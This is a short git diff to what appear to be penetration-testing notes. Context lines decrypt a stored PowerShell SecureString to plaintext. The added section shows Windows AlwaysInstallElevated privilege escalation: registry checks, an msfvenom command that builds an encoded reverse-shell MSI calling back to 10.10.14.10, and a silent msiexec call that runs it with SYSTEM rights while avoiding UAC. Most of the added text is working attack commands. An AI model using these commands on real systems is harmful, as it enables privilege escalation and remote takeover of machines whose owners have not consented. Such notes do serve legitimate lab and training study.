@@ -59,3 +59,13 @@ $credential.GetNetworkCredential().Password <br />
 
 $secretStuff = Get-Content  -Path secretstuff.txt | ConvertTo-SecureString <br />
 [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((($secretStuff))))
+
+## Checking and exploiting AlwaysInstallElevated Permission
+
+To check if this permission is enabled or not
+
+1. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+2. reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+If both of these come 0x1 then that means the permissions is allowed.
+If it is allowed then we can install any .msi file with system privelages so now we just need to make a payload from msfvenom like this "msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=2345 --encoder x64/xor --iterations 9 --format msi --out test.msi" and put it in the target box and simply execute it by not trigger the uac and any gui with this "msiexec /quiet /qn /i test.msi" and u get a shell on your listener
